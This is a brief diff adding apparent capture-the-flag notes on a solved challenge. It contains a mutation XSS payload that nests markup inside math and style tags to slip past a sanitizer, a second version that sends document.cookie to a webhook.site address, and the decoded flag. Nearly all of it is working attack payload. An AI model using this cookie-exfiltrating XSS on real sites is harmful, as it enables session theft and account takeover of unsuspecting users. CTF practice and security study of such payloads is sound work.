@@ -1,0 +1,9 @@
+# XSS worked (Mutation XSS)
+<math><xss style=display:block>t<style>X<a title=""</style><img src onerror=alert(1)>">
+
+# Update to this payload
+<math><xss style=display:block>t<style>X<a title=""</style><img src onerror=fetch('https://webhook.site/1259045f-076d-49d7-9435-e1d8058799fd/?c='+btoa(document.cookie));>">
+
+# Report
+Get ZmxhZz1DVEZ7NWM5MmVkY2IwYmQxY2Q3ZDhiZjg1OTdmNmFjZTA3MTZ9
+which is flag=CTF{5c92edcb0bd1cd7d8bf8597f6ace0716}
